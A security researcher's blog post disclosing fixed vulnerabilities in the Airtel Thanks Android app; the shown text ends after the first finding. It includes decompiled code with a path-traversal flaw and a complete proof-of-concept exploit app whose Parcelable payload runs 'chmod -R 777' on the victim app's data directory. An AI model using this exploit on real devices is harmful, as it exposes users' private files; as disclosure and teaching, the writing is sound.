<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Multiple Vulnerabilities found in Airtel Android Application | Gaurang Bhatnagar</title><meta name=keywords content="Android,bug bounty"><meta name=description content="Before presenting my talk at SourceZeroCon on Deep Dive into Android Static Analysis, I spent a lot of time understanding WebViews and looked for vulnerable implementations in popular Android applications (mainly applications with 100M+ downloads). One such application was Airtel Thanks where I identified a number of vulnerabilities. This blog post discusses about the high impact vulnerabilities that were reported.
Airtel has fixed these vulnerabilities and it is recommended to update Airtel Thanks application to the latest version from Play Store."><meta name=author content="Gaurang Bhatnagar"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="G-XNVLZLHRRE"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.a65f8ab9139e332ad4e22a6568e8bc26b4c4ec6ff0dcd1d22ffc4018f5425c38.css integrity="sha256-pl+KuROeMyrU4iplaOi8JrTE7G/w3NHSL/xAGPVCXDg=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://offsec.space/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://offsec.space/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://offsec.space/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://offsec.space/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://offsec.space/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-XNVLZLHRRE"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-XNVLZLHRRE",{anonymize_ip:!1})}</script><meta property="og:title" content="Multiple Vulnerabilities found in Airtel Android Application"><meta property="og:description" content="Before presenting my talk at SourceZeroCon on Deep Dive into Android Static Analysis, I spent a lot of time understanding WebViews and looked for vulnerable implementations in popular Android applications (mainly applications with 100M+ downloads). One such application was Airtel Thanks where I identified a number of vulnerabilities. This blog post discusses about the high impact vulnerabilities that were reported.
Airtel has fixed these vulnerabilities and it is recommended to update Airtel Thanks application to the latest version from Play Store."><meta property="og:type" content="article"><meta property="og:url" content="https://offsec.space/posts/airtel-vulnerabilities/"><meta property="og:image" content="https://offsec.space/img/airtel/cover.svg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-11-27T01:30:03+00:00"><meta property="article:modified_time" content="2022-11-27T01:30:03+00:00"><meta property="og:site_name" content="Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://offsec.space/img/airtel/cover.svg"><meta name=twitter:title content="Multiple Vulnerabilities found in Airtel Android Application"><meta name=twitter:description content="Before presenting my talk at SourceZeroCon on Deep Dive into Android Static Analysis, I spent a lot of time understanding WebViews and looked for vulnerable implementations in popular Android applications (mainly applications with 100M+ downloads). One such application was Airtel Thanks where I identified a number of vulnerabilities. This blog post discusses about the high impact vulnerabilities that were reported.
Airtel has fixed these vulnerabilities and it is recommended to update Airtel Thanks application to the latest version from Play Store."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://offsec.space/posts/"},{"@type":"ListItem","position":2,"name":"Multiple Vulnerabilities found in Airtel Android Application","item":"https://offsec.space/posts/airtel-vulnerabilities/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Multiple Vulnerabilities found in Airtel Android Application","name":"Multiple Vulnerabilities found in Airtel Android Application","description":"Before presenting my talk at SourceZeroCon on Deep Dive into Android Static Analysis, I spent a lot of time understanding WebViews and looked for vulnerable implementations in popular Android applications (mainly applications with 100M+ downloads). One such application was Airtel Thanks where I identified a number of vulnerabilities. This blog post discusses about the high impact vulnerabilities that were reported.\nAirtel has fixed these vulnerabilities and it is recommended to update Airtel Thanks application to the latest version from Play Store.","keywords":["Android","bug bounty"],"articleBody":"Before presenting my talk at SourceZeroCon on Deep Dive into Android Static Analysis, I spent a lot of time understanding WebViews and looked for vulnerable implementations in popular Android applications (mainly applications with 100M+ downloads). One such application was Airtel Thanks where I identified a number of vulnerabilities. This blog post discusses about the high impact vulnerabilities that were reported.\nAirtel has fixed these vulnerabilities and it is recommended to update Airtel Thanks application to the latest version from Play Store. These vulnerabilities were rewarded $4000 by Google as part of the GPSRP.\nThe application could be exploited by remote users and third-party applications on the Android device.\nRemote attackers could exploit vulnerabilities in the Airtel application to:\nMount phishing attacks Steal the user’s location Retrieve sensitive header values from API endpoints Steal local database files with the help of a third-party Android application. Third-party applications on the Android device could exploit vulnerabilities in the application to execute arbitrary code in the Airtel application. As a result, this would allow:\nSteal all user files (app’s internal storage) containing sensitive information and send it to remote domain Access contact information Send SMS messages Use Airtel app’s location access to track the device and user Access user personal information (phone number, email address etc.) Inject code to grab credentials Arbitrary Code Execution The Airtel android application used a vulnerable version of the Google Play Core library known to contain arbitrary code execution vulnerability. Airtel has fixed this vulnerability by updating the Play Core Library to the latest version. The vulnerability was fixed in Airtel Thanks version 4.31.1.6.\nHere’s the vulnerable code snippet taken from the application where the library copies content from the URI from split_file_intents into the unverified-splits directory under the name split_id, which is subject to path-traversal due to the absence of validation.\nfor (Intent next : list) { String stringExtra = next.getStringExtra(\"split_id\"); AssetFileDescriptor openAssetFileDescriptor = this.f21978a.getContentResolver().openAssetFileDescriptor(next.getData(), \"r\"); C7869d dVar = this.f21979b; if (dVar != null) { File file = new File(dVar.mo29396g(), \"unverified-splits\"); C7869d.m17190c(file); File file2 = new File(file, C7869d.m17192i(stringExtra)); if (((file2.exists() \u0026\u0026 file2.length() != openAssetFileDescriptor.getLength()) || !file2.exists()) \u0026\u0026 !this.f21979b.mo29393b(stringExtra).exists()) { BufferedInputStream bufferedInputStream = new BufferedInputStream(openAssetFileDescriptor.createInputStream()); try { fileOutputStream = new FileOutputStream(file2); byte[] bArr = new byte[4096]; while (true) { int read = bufferedInputStream.read(bArr); if (read \u003c= 0) { break; } fileOutputStream.write(bArr, 0, read); Exploit To exploit this vulnerability a malicious Android application was created. The following code executes the command chmod -R 777 /data/user/0/com.myairtelapp in the context of the vulnerable app.\nMainactivity.java:\npublic static final String APP = \"com.myairtelapp\"; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); Intent launchIntent = getPackageManager().getLaunchIntentForPackage(APP); startActivity(launchIntent); new Handler().postDelayed(() -\u003e { Intent split = new Intent(); split.setData(Uri.parse(\"file://\" + getApplicationInfo().sourceDir)); split.putExtra(\"split_id\", \"../verified-splits/config.test\"); Bundle bundle = new Bundle(); bundle.putInt(\"status\", 3); bundle.putParcelableArrayList(\"split_file_intents\", new ArrayList\u003cParcelable\u003e(Arrays.asList(split))); Intent intent = new Intent(\"com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService\"); intent.setPackage(APP); intent.putExtra(\"session_state\", bundle); sendBroadcast(intent); }, 3000); new Handler().postDelayed(() -\u003e { startActivity(launchIntent.putExtra(\"x\", new ParcelableObject())); }, 5000); } } Code for the class that executes the command under the attacker’s control on deserialization:\nPareceableObject.java:\npublic class ParcelableObject implements Parcelable { protected ParcelableObject(Parcel in) { } public static final Creator\u003cParcelableObject\u003e CREATOR = new Creator\u003cParcelableObject\u003e() { @Override public ParcelableObject createFromParcel(Parcel in) { exploit(); return null; } @Override public ParcelableObject[] newArray(int size) { exploit(); return null; } private void exploit() { try { Runtime.getRuntime().exec(\"chmod -R 777 /data/user/0/\" + MainActivity.APP).waitFor(); } catch (Throwable th) { throw new RuntimeException(th); } } }; public ParcelableObject() { } @Override public int describeContents() { return 0; } @Override public void writeToParcel(Parcel parcel, int i) { } } The exploit app executes the command chmod -R 777 /data/user/0/com.myairtelapp in the context of the Airtel application, which makes the Airtel app local directory (/data/user/0/com.myairtelapp) to world readable and writeable. Thus, allowing any application on the non-rooted device to access the user’s sensitive files located in the Airtel application directory.\nIf a malicious application exploits this vulnerability, it can gain code execution inside the application and have the same access as the vulnerable application.\nLack of Host Validation A deeplink feature in the Airtel application failed to validate the requested endpoint. A specially crafted request from a website or a third-party app on the device could trigger the deeplink and redirect the user to a specific destination.\nLoading Arbitrary URL’s in WebView The android app registers the scheme myairtel and host app as shown in AndroidManifest.xml file.\nAndroidManifest.xml:\n","wordCount":"1542","inLanguage":"en","image":"https://offsec.space/img/airtel/cover.svg","datePublished":"2022-11-27T01:30:03Z","dateModified":"2022-11-27T01:30:03Z","author":{"@type":"Person","name":"Gaurang Bhatnagar"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://offsec.space/posts/airtel-vulnerabilities/"},"publisher":{"@type":"Organization","name":"Gaurang Bhatnagar","logo":{"@type":"ImageObject","url":"https://offsec.space/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://offsec.space/ accesskey=h title="Home (Alt + H)"><img src=https://offsec.space/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://offsec.space/about/ title=About><span>About</span></a></li><li><a href=https://offsec.space/posts/ title=Posts><span>Posts</span></a></li><li><a href=https://offsec.space/projects/ title=Projects><span>Projects</span></a></li><li><a href=https://offsec.space/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://offsec.space/>Home</a>&nbsp;»&nbsp;<a href=https://offsec.space/posts/>Posts</a></div><h1 class=post-title>Multiple Vulnerabilities found in Airtel Android Application</h1><div class=post-meta><span title='2022-11-27 01:30:03 +0000 +0000'>November 27, 2022</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;1542 words&nbsp;·&nbsp;Gaurang Bhatnagar&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/airtel-vulnerabilities.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><figure class=entry-cover><img loading=lazy src=https://offsec.space/img/airtel/cover.svg alt><p></p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#arbitrary-code-execution>Arbitrary Code Execution</a><ul><li><a href=#exploit>Exploit</a></li></ul></li><li><a href=#lack-of-host-validation>Lack of Host Validation</a><ul><li><a href=#loading-arbitrary-urls-in-webview>Loading Arbitrary URL&rsquo;s in WebView</a></li><li><a href=#stealing-geolocation-data>Stealing Geolocation Data</a></li><li><a href=#theft-of-cookies-via-symlink-attack>Theft of cookies via Symlink attack</a></li></ul></li><li><a href=#mitigating-these-vulnerabilities>Mitigating these vulnerabilities</a></li><li><a href=#disclosure-timelines>Disclosure Timelines</a></li></ul></nav></div></details></div><div class=post-content><p>Before presenting my talk at SourceZeroCon on <a href=https://speakerdeck.com/0xgaurang/deep-dive-into-android-static-analysis-and-exploitation>Deep Dive into Android Static Analysis</a>, I spent a lot of time understanding WebViews and looked for vulnerable implementations in popular Android applications (mainly applications with 100M+ downloads). One such application was <a href="https://play.google.com/store/apps/details?id=com.myairtelapp&hl=en_IN&gl=US">Airtel Thanks</a> where I identified a number of vulnerabilities. This blog post discusses about the high impact vulnerabilities that were reported.</p><p>Airtel has fixed these vulnerabilities and it is recommended to update <a href="https://play.google.com/store/apps/details?id=com.myairtelapp&hl=en_IN&gl=US">Airtel Thanks</a> application to the latest version from Play Store.
These vulnerabilities were rewarded $4000 by Google as part of the <a href=https://bughunters.google.com/about/rules/5604090422493184/google-play-security-reward-program-rules>GPSRP</a>.</p><p>The application could be exploited by remote users and third-party applications on the Android device.</p><p><code>Remote attackers</code> could exploit vulnerabilities in the Airtel application to:</p><ul><li>Mount phishing attacks</li><li>Steal the user&rsquo;s location</li><li>Retrieve sensitive header values from API endpoints</li><li>Steal local database files with the help of a third-party Android application.</li></ul><p><code>Third-party applications</code> on the Android device could exploit vulnerabilities in the application to execute arbitrary code in the Airtel application. As a result, this would allow:</p><ul><li>Steal all user files (app&rsquo;s internal storage) containing sensitive information and send it to remote domain</li><li>Access contact information</li><li>Send SMS messages</li><li>Use Airtel app’s location access to track the device and user</li><li>Access user personal information (phone number, email address etc.)</li><li>Inject code to grab credentials</li></ul><h2 id=arbitrary-code-execution>Arbitrary Code Execution<a hidden class=anchor aria-hidden=true href=#arbitrary-code-execution>#</a></h2><p>The Airtel android application used a vulnerable version of the <a href=https://developer.android.com/reference/com/google/android/play/core/release-notes#1-7-2>Google Play Core library</a> known to contain arbitrary code execution vulnerability. Airtel has fixed this vulnerability by updating the <code>Play Core Library</code> to the latest version. The vulnerability was fixed in Airtel Thanks version <code>4.31.1.6</code>.</p><p>Here&rsquo;s the vulnerable code snippet taken from the application where the library copies content from the URI from <code>split_file_intents</code> into the <code>unverified-splits directory</code> under the name <code>split_id</code>, which is subject to path-traversal due to the absence of validation.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>for</span> <span class=o>(</span><span class=n>Intent</span> <span class=n>next</span> <span class=o>:</span> <span class=n>list</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>String</span> <span class=n>stringExtra</span> <span class=o>=</span> <span class=n>next</span><span class=o>.</span><span class=na>getStringExtra</span><span class=o>(</span><span class=s>&#34;split_id&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>                <span class=n>AssetFileDescriptor</span> <span class=n>openAssetFileDescriptor</span> <span class=o>=</span> <span class=k>this</span><span class=o>.</span><span class=na>f21978a</span><span class=o>.</span><span class=na>getContentResolver</span><span class=o>().</span><span class=na>openAssetFileDescriptor</span><span class=o>(</span><span class=n>next</span><span class=o>.</span><span class=na>getData</span><span class=o>(),</span> <span class=s>&#34;r&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>                <span class=n>C7869d</span> <span class=n>dVar</span> <span class=o>=</span> <span class=k>this</span><span class=o>.</span><span class=na>f21979b</span><span class=o>;</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=o>(</span><span class=n>dVar</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=n>File</span> <span class=n>file</span> <span class=o>=</span> <span class=k>new</span> <span class=n>File</span><span class=o>(</span><span class=n>dVar</span><span class=o>.</span><span class=na>mo29396g</span><span class=o>(),</span> <span class=s>&#34;unverified-splits&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>                    <span class=n>C7869d</span><span class=o>.</span><span class=na>m17190c</span><span class=o>(</span><span class=n>file</span><span class=o>);</span>
</span></span><span class=line><span class=cl>                    <span class=n>File</span> <span class=n>file2</span> <span class=o>=</span> <span class=k>new</span> <span class=n>File</span><span class=o>(</span><span class=n>file</span><span class=o>,</span> <span class=n>C7869d</span><span class=o>.</span><span class=na>m17192i</span><span class=o>(</span><span class=n>stringExtra</span><span class=o>));</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=o>(((</span><span class=n>file2</span><span class=o>.</span><span class=na>exists</span><span class=o>()</span> <span class=o>&amp;&amp;</span> <span class=n>file2</span><span class=o>.</span><span class=na>length</span><span class=o>()</span> <span class=o>!=</span> <span class=n>openAssetFileDescriptor</span><span class=o>.</span><span class=na>getLength</span><span class=o>())</span> <span class=o>||</span> <span class=o>!</span><span class=n>file2</span><span class=o>.</span><span class=na>exists</span><span class=o>())</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=k>this</span><span class=o>.</span><span class=na>f21979b</span><span class=o>.</span><span class=na>mo29393b</span><span class=o>(</span><span class=n>stringExtra</span><span class=o>).</span><span class=na>exists</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                        <span class=n>BufferedInputStream</span> <span class=n>bufferedInputStream</span> <span class=o>=</span> <span class=k>new</span> <span class=n>BufferedInputStream</span><span class=o>(</span><span class=n>openAssetFileDescriptor</span><span class=o>.</span><span class=na>createInputStream</span><span class=o>());</span>
</span></span><span class=line><span class=cl>                        <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                            <span class=n>fileOutputStream</span> <span class=o>=</span> <span class=k>new</span> <span class=n>FileOutputStream</span><span class=o>(</span><span class=n>file2</span><span class=o>);</span>
</span></span><span class=line><span class=cl>                            <span class=kt>byte</span><span class=o>[]</span> <span class=n>bArr</span> <span class=o>=</span> <span class=k>new</span> <span class=kt>byte</span><span class=o>[</span><span class=n>4096</span><span class=o>];</span>
</span></span><span class=line><span class=cl>                            <span class=k>while</span> <span class=o>(</span><span class=kc>true</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                                <span class=kt>int</span> <span class=n>read</span> <span class=o>=</span> <span class=n>bufferedInputStream</span><span class=o>.</span><span class=na>read</span><span class=o>(</span><span class=n>bArr</span><span class=o>);</span>
</span></span><span class=line><span class=cl>                                <span class=k>if</span> <span class=o>(</span><span class=n>read</span> <span class=o>&lt;=</span> <span class=n>0</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                                    <span class=k>break</span><span class=o>;</span>
</span></span><span class=line><span class=cl>                                <span class=o>}</span>
</span></span><span class=line><span class=cl>                                <span class=n>fileOutputStream</span><span class=o>.</span><span class=na>write</span><span class=o>(</span><span class=n>bArr</span><span class=o>,</span> <span class=n>0</span><span class=o>,</span> <span class=n>read</span><span class=o>);</span>
</span></span></code></pre></div><h3 id=exploit>Exploit<a hidden class=anchor aria-hidden=true href=#exploit>#</a></h3><p>To exploit this vulnerability a malicious Android application was created. The following code executes the command <code>chmod -R 777 /data/user/0/com.myairtelapp</code> in the context of the vulnerable app.</p><p><code>Mainactivity.java</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kd>final</span> <span class=n>String</span> <span class=n>APP</span> <span class=o>=</span> <span class=s>&#34;com.myairtelapp&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@Override</span>
</span></span><span class=line><span class=cl>    <span class=kd>protected</span> <span class=kt>void</span> <span class=nf>onCreate</span><span class=o>(</span><span class=n>Bundle</span> <span class=n>savedInstanceState</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>super</span><span class=o>.</span><span class=na>onCreate</span><span class=o>(</span><span class=n>savedInstanceState</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Intent</span> <span class=n>launchIntent</span> <span class=o>=</span> <span class=n>getPackageManager</span><span class=o>().</span><span class=na>getLaunchIntentForPackage</span><span class=o>(</span><span class=n>APP</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>startActivity</span><span class=o>(</span><span class=n>launchIntent</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>new</span> <span class=n>Handler</span><span class=o>().</span><span class=na>postDelayed</span><span class=o>(()</span> <span class=o>-&gt;</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>Intent</span> <span class=n>split</span> <span class=o>=</span> <span class=k>new</span> <span class=n>Intent</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=n>split</span><span class=o>.</span><span class=na>setData</span><span class=o>(</span><span class=n>Uri</span><span class=o>.</span><span class=na>parse</span><span class=o>(</span><span class=s>&#34;file://&#34;</span> <span class=o>+</span> <span class=n>getApplicationInfo</span><span class=o>().</span><span class=na>sourceDir</span><span class=o>));</span>
</span></span><span class=line><span class=cl>            <span class=n>split</span><span class=o>.</span><span class=na>putExtra</span><span class=o>(</span><span class=s>&#34;split_id&#34;</span><span class=o>,</span> <span class=s>&#34;../verified-splits/config.test&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>Bundle</span> <span class=n>bundle</span> <span class=o>=</span> <span class=k>new</span> <span class=n>Bundle</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=n>bundle</span><span class=o>.</span><span class=na>putInt</span><span class=o>(</span><span class=s>&#34;status&#34;</span><span class=o>,</span> <span class=n>3</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=n>bundle</span><span class=o>.</span><span class=na>putParcelableArrayList</span><span class=o>(</span><span class=s>&#34;split_file_intents&#34;</span><span class=o>,</span> <span class=k>new</span> <span class=n>ArrayList</span><span class=o>&lt;</span><span class=n>Parcelable</span><span class=o>&gt;(</span><span class=n>Arrays</span><span class=o>.</span><span class=na>asList</span><span class=o>(</span><span class=n>split</span><span class=o>)));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>Intent</span> <span class=n>intent</span> <span class=o>=</span> <span class=k>new</span> <span class=n>Intent</span><span class=o>(</span><span class=s>&#34;com.google.android.play.core.splitinstall.receiver.SplitInstallUpdateIntentService&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=n>intent</span><span class=o>.</span><span class=na>setPackage</span><span class=o>(</span><span class=n>APP</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=n>intent</span><span class=o>.</span><span class=na>putExtra</span><span class=o>(</span><span class=s>&#34;session_state&#34;</span><span class=o>,</span> <span class=n>bundle</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=n>sendBroadcast</span><span class=o>(</span><span class=n>intent</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>},</span> <span class=n>3000</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>new</span> <span class=n>Handler</span><span class=o>().</span><span class=na>postDelayed</span><span class=o>(()</span> <span class=o>-&gt;</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>startActivity</span><span class=o>(</span><span class=n>launchIntent</span><span class=o>.</span><span class=na>putExtra</span><span class=o>(</span><span class=s>&#34;x&#34;</span><span class=o>,</span> <span class=k>new</span> <span class=n>ParcelableObject</span><span class=o>()));</span>
</span></span><span class=line><span class=cl>        <span class=o>},</span> <span class=n>5000</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></div><p>Code for the class that executes the command under the attacker’s control on deserialization:</p><p><code>PareceableObject.java</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>class</span> <span class=nc>ParcelableObject</span> <span class=kd>implements</span> <span class=n>Parcelable</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>protected</span> <span class=nf>ParcelableObject</span><span class=o>(</span><span class=n>Parcel</span> <span class=n>in</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kd>static</span> <span class=kd>final</span> <span class=n>Creator</span><span class=o>&lt;</span><span class=n>ParcelableObject</span><span class=o>&gt;</span> <span class=n>CREATOR</span> <span class=o>=</span> <span class=k>new</span> <span class=n>Creator</span><span class=o>&lt;</span><span class=n>ParcelableObject</span><span class=o>&gt;()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=nd>@Override</span>
</span></span><span class=line><span class=cl>        <span class=kd>public</span> <span class=n>ParcelableObject</span> <span class=nf>createFromParcel</span><span class=o>(</span><span class=n>Parcel</span> <span class=n>in</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>exploit</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>null</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nd>@Override</span>
</span></span><span class=line><span class=cl>        <span class=kd>public</span> <span class=n>ParcelableObject</span><span class=o>[]</span> <span class=nf>newArray</span><span class=o>(</span><span class=kt>int</span> <span class=n>size</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>exploit</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>null</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kt>void</span> <span class=nf>exploit</span><span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=n>Runtime</span><span class=o>.</span><span class=na>getRuntime</span><span class=o>().</span><span class=na>exec</span><span class=o>(</span><span class=s>&#34;chmod -R 777 /data/user/0/&#34;</span> <span class=o>+</span> <span class=n>MainActivity</span><span class=o>.</span><span class=na>APP</span><span class=o>).</span><span class=na>waitFor</span><span class=o>();</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>Throwable</span> <span class=n>th</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=k>new</span> <span class=n>RuntimeException</span><span class=o>(</span><span class=n>th</span><span class=o>);</span>
</span></span><span class=line><span class=cl>            <span class=o>}</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=nf>ParcelableObject</span><span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@Override</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kt>int</span> <span class=nf>describeContents</span><span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>0</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@Override</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kt>void</span> <span class=nf>writeToParcel</span><span class=o>(</span><span class=n>Parcel</span> <span class=n>parcel</span><span class=o>,</span> <span class=kt>int</span> <span class=n>i</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>}</span>
